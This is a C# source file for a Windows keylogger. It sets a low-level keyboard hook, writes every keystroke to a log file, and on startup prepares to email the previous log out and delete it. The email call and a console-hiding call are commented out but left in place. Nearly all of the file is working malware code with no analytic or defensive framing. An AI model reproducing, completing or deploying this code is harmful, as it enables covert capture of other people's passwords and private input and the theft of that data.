using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using Keylogger;

class InterceptKeys
{

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Main()
    {
        ConsoleProcess.SayHello();
        try
        {
            using (FileStream fs = new FileStream(Const.file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                ConsoleProcess.Say(String.Format("Found file '{0}'", Const.file));
                if (fs != null)
                {
                    ConsoleProcess.Say(String.Format("Sending '{0}'", Const.file));
                    //MailProcess.SendEmail(fs);
                    ConsoleProcess.Say(String.Format("Sent file '{0}'", Const.file));
                    fs.Dispose();
                    File.Delete(Const.file);
                    ConsoleProcess.Say(String.Format("Delete file '{0}'", Const.file));
                }
            }
        }
        catch (Exception ex)
        {
            ConsoleProcess.Say(ex.ToString());
        }

        var handle = GetConsoleWindow();

        // Hide
        //ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(Const.WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)Const.WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            ConsoleProcess.Say(((Keys)vkCode).ToString());
            StreamWriter sw = new StreamWriter(Application.StartupPath +"\\" +Const.file,true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}